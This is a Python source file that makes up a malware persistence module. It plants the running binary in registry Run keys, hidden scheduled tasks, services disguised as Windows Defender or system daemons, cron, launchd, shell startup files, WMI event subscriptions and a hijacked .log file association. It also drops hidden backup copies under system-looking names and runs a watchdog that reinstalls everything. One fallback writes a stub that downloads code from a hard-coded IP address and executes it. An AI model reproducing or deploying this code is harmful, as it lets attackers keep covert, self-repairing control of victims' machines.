
import os
import sys
import platform
import json
import base64
import hashlib
import time
import random
import shutil
import subprocess
import ctypes
import winreg  # Windows only
from pathlib import Path
from datetime import datetime
import logging

logger = logging.getLogger(__name__)

class EnhancedPersistence:
    """
    Enhanced persistence with multiple techniques and self-healing
    """
    
    def __init__(self, malware_path=None):
        self.malware_path = malware_path or os.path.abspath(sys.argv[0])
        self.persistence_methods = []
        self.backup_locations = []
        self.watchdog_enabled = False
        self.persistence_config = self._load_config()
        
        # Determine OS
        self.is_windows = platform.system() == 'Windows'
        self.is_linux = platform.system() == 'Linux'
        self.is_macos = platform.system() == 'Darwin'
        
        # User info
        self.current_user = os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER', 'unknown')
        self.is_admin = self._check_admin_privileges()
        
        # Generate unique implant ID
        self.implant_id = self._generate_implant_id()
        
        logger.info(f"Persistence manager initialized for {platform.system()}")
    
    def _load_config(self):
        """Load persistence configuration"""
        default_config = {
            'methods': ['registry', 'scheduled_task', 'service', 'startup_folder'],
            'backup_count': 3,
            'watchdog_interval': 60,
            'self_heal': True,
            'stealth_level': 'medium'
        }
        
        try:
            with open('persistence_config.json', 'r') as f:
                user_config = json.load(f)
                default_config.update(user_config)
        except:
            pass
        
        return default_config
    
    def _generate_implant_id(self):
        """Generate unique implant ID"""
        system_info = f"{platform.node()}{os.getpid()}{time.time()}"
        return hashlib.md5(system_info.encode()).hexdigest()[:12]
    
    def _check_admin_privileges(self):
        """Check if running with admin/root privileges"""
        try:
            if self.is_windows:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.getuid() == 0
        except:
            return False
    
    def add_persistence(self, method=None):
        """
        Add persistence using specified method or auto-select
        """
        if method:
            methods = [method]
        else:
            methods = self.persistence_config['methods']
        
        successful_methods = []
        
        for method in methods:
            try:
                if method == 'registry' and self.is_windows:
                    if self._add_registry_persistence():
                        successful_methods.append('registry')
                
                elif method == 'scheduled_task' and self.is_windows:
                    if self._add_scheduled_task():
                        successful_methods.append('scheduled_task')
                
                elif method == 'service' and (self.is_windows or self.is_linux):
                    if self._add_service_persistence():
                        successful_methods.append('service')
                
                elif method == 'startup_folder' and self.is_windows:
                    if self._add_startup_folder():
                        successful_methods.append('startup_folder')
                
                elif method == 'cron' and (self.is_linux or self.is_macos):
                    if self._add_cron_job():
                        successful_methods.append('cron')
                
                elif method == 'launchd' and self.is_macos:
                    if self._add_launchd_persistence():
                        successful_methods.append('launchd')
                
                elif method == 'bashrc' and (self.is_linux or self.is_macos):
                    if self._add_bashrc_persistence():
                        successful_methods.append('bashrc')
                
                elif method == 'wmi' and self.is_windows:
                    if self._add_wmi_persistence():
                        successful_methods.append('wmi')
                
                elif method == 'file_association' and self.is_windows:
                    if self._add_file_association():
                        successful_methods.append('file_association')
                
                time.sleep(0.5)  # Small delay between methods
                
            except Exception as e:
                logger.error(f"Failed to add persistence method {method}: {e}")
        
        # Create backups
        if successful_methods:
            self._create_backups()
            
            # Start watchdog if enabled
            if self.persistence_config.get('self_heal', True):
                self._start_watchdog()
        
        return successful_methods
    
    def _add_registry_persistence(self):
        """Add registry persistence (Windows)"""
        try:
            # Common registry locations
            registry_locations = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Windows", "Load"),  # Win.ini load
            ]
            
            entry_name = f"SystemMetrics_{random.randint(1000, 9999)}"
            
            for root, path, value_name in registry_locations:
                try:
                    if '\\' in path:
                        key_path, subkey = path.rsplit('\\', 1)
                        key = winreg.OpenKey(root, key_path, 0, winreg.KEY_SET_VALUE)
                    else:
                        key = winreg.OpenKey(root, path, 0, winreg.KEY_SET_VALUE)
                        subkey = None
                    
                    # Set value
                    if value_name:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, self.malware_path)
                    elif subkey:
                        winreg.SetValueEx(key, subkey, 0, winreg.REG_SZ, self.malware_path)
                    else:
                        winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, self.malware_path)
                    
                    winreg.CloseKey(key)
                    logger.info(f"Added registry persistence: {root}\\{path}")
                    
                except Exception as e:
                    logger.debug(f"Failed registry location {path}: {e}")
                    continue
            
            self.persistence_methods.append('registry')
            return True
            
        except Exception as e:
            logger.error(f"Registry persistence failed: {e}")
            return False
    
    def _add_scheduled_task(self):
        """Add scheduled task persistence (Windows)"""
        try:
            task_name = f"WindowsUpdate_{random.randint(10000, 99999)}"
            
            # Create XML task definition
            xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Maintenance</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <CalendarTrigger>
      <StartBoundary>2023-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{self.malware_path}</Command>
    </Exec>
  </Actions>
</Task>'''
            
            # Save XML to temp file
            xml_path = os.path.join(os.environ['TEMP'], f'{task_name}.xml')
            with open(xml_path, 'w') as f:
                f.write(xml_template)
            
            # Create task
            cmd = f'schtasks /create /tn "{task_name}" /xml "{xml_path}" /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # Clean up
            os.remove(xml_path)
            
            if result.returncode == 0:
                logger.info(f"Created scheduled task: {task_name}")
                self.persistence_methods.append('scheduled_task')
                return True
            else:
                logger.error(f"Failed to create scheduled task: {result.stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Scheduled task persistence failed: {e}")
            return False
    
    def _add_service_persistence(self):
        """Add service persistence"""
        try:
            if self.is_windows:
                return self._add_windows_service()
            elif self.is_linux:
                return self._add_linux_service()
            elif self.is_macos:
                return self._add_macos_service()
        except Exception as e:
            logger.error(f"Service persistence failed: {e}")
            return False
    
    def _add_windows_service(self):
        """Add Windows service"""
        try:
            service_name = f"WinDefend{random.randint(100, 999)}"
            display_name = "Windows Defender Service"
            
            # Use sc.exe to create service
            cmd = f'sc create "{service_name}" binPath= "{self.malware_path}" DisplayName= "{display_name}" start= auto'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Set service description
                desc_cmd = f'sc description "{service_name}" "Helps protect your computer from malware and other potentially unwanted software."'
                subprocess.run(desc_cmd, shell=True, capture_output=True)
                
                logger.info(f"Created Windows service: {service_name}")
                self.persistence_methods.append('service')
                return True
            else:
                logger.error(f"Failed to create Windows service: {result.stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Windows service creation failed: {e}")
            return False
    
    def _add_linux_service(self):
        """Add Linux service (systemd)"""
        try:
            service_name = f"systemd-network{random.randint(100, 999)}"
            service_file = f"/etc/systemd/system/{service_name}.service"
            
            # Check if we have write permission
            if not os.access('/etc/systemd/system', os.W_OK) and not self.is_admin:
                logger.warning("No permission to write systemd service files")
                return False
            
            service_content = f"""[Unit]
Description=Systemd Network Service
After=network.target

[Service]
Type=simple
ExecStart={self.malware_path}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
            
            # Write service file
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            # Enable and start service
            subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
            subprocess.run(['systemctl', 'enable', service_name], capture_output=True)
            subprocess.run(['systemctl', 'start', service_name], capture_output=True)
            
            logger.info(f"Created Linux service: {service_name}")
            self.persistence_methods.append('service')
            return True
            
        except Exception as e:
            logger.error(f"Linux service creation failed: {e}")
            return False
    
    def _add_macos_service(self):
        """Add macOS launchd service"""
        try:
            service_name = f"com.apple.audio{random.randint(10000, 99999)}"
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{service_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.malware_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/tmp/{service_name}.err</string>
    <key>StandardOutPath</key>
    <string>/tmp/{service_name}.out</string>
</dict>
</plist>"""
            
            # Write to LaunchAgents directory
            plist_path = f"/Library/LaunchAgents/{service_name}.plist"
            
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            # Load the service
            subprocess.run(['launchctl', 'load', plist_path], capture_output=True)
            
            logger.info(f"Created macOS service: {service_name}")
            self.persistence_methods.append('service')
            return True
            
        except Exception as e:
            logger.error(f"macOS service creation failed: {e}")
            return False
    
    def _add_startup_folder(self):
        """Add to startup folder (Windows)"""
        try:
            startup_folder = os.path.join(
                os.environ['APPDATA'],
                'Microsoft',
                'Windows',
                'Start Menu',
                'Programs',
                'Startup'
            )
            
            os.makedirs(startup_folder, exist_ok=True)
            
            # Create shortcut
            shortcut_name = f"Windows Update.lnk"
            shortcut_path = os.path.join(startup_folder, shortcut_name)
            
            # Create VBS script to create shortcut
            vbs_script = f"""
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "{shortcut_path}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "{self.malware_path}"
oLink.WindowStyle = 7  'Minimized
oLink.Save
"""
            
            vbs_path = os.path.join(os.environ['TEMP'], 'create_shortcut.vbs')
            with open(vbs_path, 'w') as f:
                f.write(vbs_script)
            
            # Execute VBS
            subprocess.run(['cscript', '//B', '//Nologo', vbs_path], capture_output=True)
            
            # Clean up
            os.remove(vbs_path)
            
            logger.info(f"Added to startup folder: {shortcut_name}")
            self.persistence_methods.append('startup_folder')
            return True
            
        except Exception as e:
            logger.error(f"Startup folder persistence failed: {e}")
            return False
    
    def _add_cron_job(self):
        """Add cron job persistence (Linux/macOS)"""
        try:
            # Create a harmless-looking script
            script_content = f"""#!/bin/bash
# System update script
sleep $((RANDOM % 60))
"{self.malware_path}"
"""
            
            script_name = f".system_update_{random.randint(1000, 9999)}.sh"
            script_path = os.path.join('/tmp', script_name)
            
            with open(script_path, 'w') as f:
                f.write(script_content)
            
            os.chmod(script_path, 0o755)
            
            # Add to crontab
            cron_line = f"@reboot sleep 60 && {script_path} >/dev/null 2>&1"
            
            # Get current crontab
            current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            
            # Add new line
            new_cron = current_cron.stdout + '\n' + cron_line + '\n'
            
            # Write new crontab
            process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
            process.communicate(input=new_cron)
            
            logger.info("Added cron job persistence")
            self.persistence_methods.append('cron')
            return True
            
        except Exception as e:
            logger.error(f"Cron job persistence failed: {e}")
            return False
    
    def _add_launchd_persistence(self):
        """Add launchd persistence (macOS)"""
        try:
            plist_name = f"com.apple.softwareupdate{random.randint(1000, 9999)}.plist"
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{plist_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.malware_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>"""
            
            # Write to user's LaunchAgents
            launch_agents_path = os.path.expanduser(f"~/Library/LaunchAgents/{plist_name}")
            
            with open(launch_agents_path, 'w') as f:
                f.write(plist_content)
            
            # Load the agent
            subprocess.run(['launchctl', 'load', launch_agents_path], capture_output=True)
            
            logger.info(f"Added launchd persistence: {plist_name}")
            self.persistence_methods.append('launchd')
            return True
            
        except Exception as e:
            logger.error(f"Launchd persistence failed: {e}")
            return False
    
    def _add_bashrc_persistence(self):
        """Add to bashrc/zshrc"""
        try:
            shell_files = [
                os.path.expanduser('~/.bashrc'),
                os.path.expanduser('~/.zshrc'),
                os.path.expanduser('~/.profile'),
                os.path.expanduser('~/.bash_profile')
            ]
            
            persistence_line = f'\n# System alias\nalias sysupdate="{self.malware_path}"\n'
            
            added = False
            for shell_file in shell_files:
                if os.path.exists(shell_file):
                    try:
                        with open(shell_file, 'a') as f:
                            f.write(persistence_line)
                        added = True
                        logger.info(f"Added to {shell_file}")
                    except:
                        continue
            
            if added:
                self.persistence_methods.append('bashrc')
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Bashrc persistence failed: {e}")
            return False
    
    def _add_wmi_persistence(self):
        """Add WMI event subscription persistence (Windows)"""
        try:
            # This is an advanced technique using WMI event subscriptions
            # It triggers execution on specific system events
            
            script_content = f"""$filterArgs = @{{
                Name = 'StartupFilter'
                EventNameSpace = 'root\\cimv2'
                QueryLanguage = 'WQL'
                Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
            }}
            
            $consumerArgs = @{{
                Name = 'StartupConsumer'
                CommandLineTemplate = "{self.malware_path}"
            }}
            
            $filter = Set-WmiInstance -Class __EventFilter -Namespace root/subscription -Arguments $filterArgs
            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription -Arguments $consumerArgs
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subscription -Arguments @{{Filter=$filter; Consumer=$consumer}}
            """
            
            # Save and execute PowerShell script
            ps_script = os.path.join(os.environ['TEMP'], 'wmi_persistence.ps1')
            with open(ps_script, 'w') as f:
                f.write(script_content)
            
            # Execute with PowerShell
            cmd = f'powershell -ExecutionPolicy Bypass -File "{ps_script}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # Clean up
            os.remove(ps_script)
            
            if result.returncode == 0:
                logger.info("Added WMI event subscription persistence")
                self.persistence_methods.append('wmi')
                return True
            else:
                logger.error(f"WMI persistence failed: {result.stderr}")
                return False
                
        except Exception as e:
            logger.error(f"WMI persistence failed: {e}")
            return False
    
    def _add_file_association(self):
        """Add file association persistence (Windows)"""
        try:
            # Associate with .txt files or other common extensions
            extension = '.log'  # Using .log files which are commonly opened
            
            # Create a script that runs the malware when .log files are opened
            vbs_script = f"""
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCR\\{extension}\\Shell\\Open\\Command\\", "{self.malware_path} ""%1""", "REG_SZ"
"""
            
            vbs_path = os.path.join(os.environ['TEMP'], 'file_assoc.vbs')
            with open(vbs_path, 'w') as f:
                f.write(vbs_script)
            
            # Execute
            subprocess.run(['cscript', '//B', '//Nologo', vbs_path], capture_output=True)
            
            # Clean up
            os.remove(vbs_path)
            
            logger.info(f"Added file association for {extension} files")
            self.persistence_methods.append('file_association')
            return True
            
        except Exception as e:
            logger.error(f"File association persistence failed: {e}")
            return False
    
    def _create_backups(self):
        """Create backup copies of malware in various locations"""
        backup_locations = []
        
        if self.is_windows:
            locations = [
                os.path.join(os.environ['WINDIR'], 'System32', 'drivers', 'etc', 'phantom.exe'),
                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'svchost.exe'),
                os.path.join(os.environ['TEMP'], 'windows_update.exe'),
                'C:\\Windows\\Temp\\spoolsv.exe',
                'C:\\Windows\\Tasks\\at.exe'
            ]
        elif self.is_linux:
            locations = [
                '/tmp/.systemd',
                '/var/tmp/.cron',
                '/dev/shm/.update',
                os.path.expanduser('~/.cache/.syslog'),
                '/usr/lib/.modules'
            ]
        elif self.is_macos:
            locations = [
                '/tmp/.kext',
                '/var/tmp/.launchd',
                os.path.expanduser('~/Library/Caches/.softwareupdate'),
                '/usr/libexec/.coreservices'
            ]
        
        for location in locations[:self.persistence_config.get('backup_count', 3)]:
            try:
                os.makedirs(os.path.dirname(location), exist_ok=True)
                shutil.copy2(self.malware_path, location)
                
                # Hide file (platform specific)
                if self.is_windows:
                    ctypes.windll.kernel32.SetFileAttributesW(location, 2)  # Hidden
                elif self.is_linux or self.is_macos:
                    os.system(f'chmod 600 "{location}"')
                
                backup_locations.append(location)
                logger.debug(f"Created backup at: {location}")
                
            except Exception as e:
                logger.debug(f"Failed to create backup at {location}: {e}")
        
        self.backup_locations = backup_locations
        logger.info(f"Created {len(backup_locations)} backup copies")
        
        # Save backup locations to config
        self._save_backup_info()
    
    def _save_backup_info(self):
        """Save backup information"""
        backup_info = {
            'implant_id': self.implant_id,
            'original_path': self.malware_path,
            'backup_locations': self.backup_locations,
            'persistence_methods': self.persistence_methods,
            'created': datetime.now().isoformat()
        }
        
        info_path = os.path.join(os.path.dirname(self.malware_path), '.persistence_info.json')
        try:
            with open(info_path, 'w') as f:
                json.dump(backup_info, f, indent=2)
            
            # Hide the info file
            if self.is_windows:
                ctypes.windll.kernel32.SetFileAttributesW(info_path, 2)
        except:
            pass
    
    def _start_watchdog(self):
        """Start watchdog process to maintain persistence"""
        if self.watchdog_enabled:
            return
        
        def watchdog_loop():
            self.watchdog_enabled = True
            interval = self.persistence_config.get('watchdog_interval', 60)
            
            logger.info(f"Watchdog started (checking every {interval}s)")
            
            while self.watchdog_enabled:
                try:
                    # Check if main file exists
                    if not os.path.exists(self.malware_path):
                        logger.warning("Main file deleted, restoring from backup...")
                        self._restore_from_backup()
                    
                    # Check persistence methods
                    self._verify_persistence()
                    
                    # Sleep
                    time.sleep(interval)
                    
                except Exception as e:
                    logger.error(f"Watchdog error: {e}")
                    time.sleep(min(interval, 10))
        
        # Start watchdog in background thread
        import threading
        watchdog_thread = threading.Thread(target=watchdog_loop, daemon=True)
        watchdog_thread.start()
    
    def _restore_from_backup(self):
        """Restore malware from backup"""
        for backup_location in self.backup_locations:
            if os.path.exists(backup_location):
                try:
                    shutil.copy2(backup_location, self.malware_path)
                    logger.info(f"Restored from backup: {backup_location}")
                    
                    # Re-establish persistence
                    self.add_persistence()
                    return True
                except:
                    continue
        
        # If no backups available, recreate from current process memory
        logger.warning("No backups available, attempting memory restoration...")
        return self._restore_from_memory()
    
    def _restore_from_memory(self):
        """Attempt to restore from memory (advanced technique)"""
        try:
            # This is a simplified version
            # In reality, you'd need to write the current process memory to disk
            
            # For now, just recreate a simple stub
            stub_code = '''import os, sys, subprocess, time
# Simple stub that downloads and executes the real payload
import urllib.request
try:
    response = urllib.request.urlopen("http://141.105.71.196/payload")
    exec(response.read().decode())
except:
    pass'''
            
            with open(self.malware_path, 'w') as f:
                f.write(stub_code)
            
            logger.info("Created stub malware")
            return True
            
        except:
            return False
    
    def _verify_persistence(self):
        """Verify persistence methods are still active"""
        try:
            for method in self.persistence_methods:
                if method == 'registry':
                    if not self._verify_registry_persistence():
                        logger.warning("Registry persistence lost, re-adding...")
                        self._add_registry_persistence()
                
                elif method == 'scheduled_task':
                    if not self._verify_scheduled_task():
                        logger.warning("Scheduled task lost, re-adding...")
                        self._add_scheduled_task()
                
                # Add verification for other methods...
                
        except Exception as e:
            logger.error(f"Persistence verification failed: {e}")
    
    def _verify_registry_persistence(self):
        """Verify registry persistence"""
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run")
            
            found = False
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    if self.malware_path in value:
                        found = True
                        break
                    i += 1
                except OSError:
                    break
            
            winreg.CloseKey(key)
            return found
            
        except:
            return False
    
    def _verify_scheduled_task(self):
        """Verify scheduled task exists"""
        try:
            result = subprocess.run(['schtasks', '/query', '/fo', 'LIST'], 
                                  capture_output=True, text=True)
            return self.malware_path in result.stdout
        except:
            return False
    
    def remove_persistence(self, method=None):
        """Remove persistence methods"""
        removed = []
        
        try:
            if method:
                methods = [method]
            else:
                methods = self.persistence_methods.copy()
            
            for method in methods:
                try:
                    if method == 'registry' and self.is_windows:
                        self._remove_registry_persistence()
                        removed.append('registry')
                    
                    elif method == 'scheduled_task' and self.is_windows:
                        self._remove_scheduled_tasks()
                        removed.append('scheduled_task')
                    
                    # Add removal for other methods...
                    
                    if method in self.persistence_methods:
                        self.persistence_methods.remove(method)
                        
                except Exception as e:
                    logger.error(f"Failed to remove {method}: {e}")
            
            # Remove backups
            self._remove_backups()
            
            # Stop watchdog
            self.watchdog_enabled = False
            
            logger.info(f"Removed persistence methods: {removed}")
            return removed
            
        except Exception as e:
            logger.error(f"Error removing persistence: {e}")
            return []
    
    def _remove_registry_persistence(self):
        """Remove registry persistence"""
        try:
            registry_locations = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            ]
            
            for root, path in registry_locations:
                try:
                    key = winreg.OpenKey(root, path, 0, winreg.KEY_SET_VALUE)
                    
                    i = 0
                    to_delete = []
                    while True:
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            if self.malware_path in value:
                                to_delete.append(name)
                            i += 1
                        except OSError:
                            break
                    
                    for name in to_delete:
                        try:
                            winreg.DeleteValue(key, name)
                        except:
                            pass
                    
                    winreg.CloseKey(key)
                except:
                    continue
                    
        except:
            pass
    
    def _remove_scheduled_tasks(self):
        """Remove scheduled tasks"""
        try:
            result = subprocess.run(['schtasks', '/query', '/fo', 'LIST'], 
                                  capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'TaskName:' in line and 'phantom' in line.lower():
                    task_name = line.split(':')[1].strip()
                    subprocess.run(['schtasks', '/delete', '/tn', task_name, '/f'], 
                                 capture_output=True)
        except:
            pass
    
    def _remove_backups(self):
        """Remove backup files"""
        for backup in self.backup_locations:
            try:
                if os.path.exists(backup):
                    os.remove(backup)
            except:
                pass
        
        self.backup_locations = []

def add_persistence():
    """Main function to add persistence"""
    try:
        persistence = EnhancedPersistence()
        methods = persistence.add_persistence()
        
        if methods:
            logger.info(f"Persistence established using: {', '.join(methods)}")
            return True
        else:
            logger.error("Failed to establish persistence")
            return False
            
    except Exception as e:
        logger.error(f"Persistence error: {e}")
        return False

if __name__ == "__main__":
    # Test persistence
    print("Testing Enhanced Persistence...")
    
    # Set up logging
    logging.basicConfig(level=logging.INFO)
    
    # Create persistence manager
    persistence = EnhancedPersistence()
    
    # Add persistence (auto-select based on OS)
    methods = persistence.add_persistence()
    
    if methods:
        print(f"\nSuccessfully added persistence using:")
        for method in methods:
            print(f"  - {method}")
        
        print(f"\nBackup locations: {len(persistence.backup_locations)}")
        print(f"Implant ID: {persistence.implant_id}")
        print(f"Watchdog: {'Enabled' if persistence.watchdog_enabled else 'Disabled'}")
    else:
        print("\nFailed to add persistence")

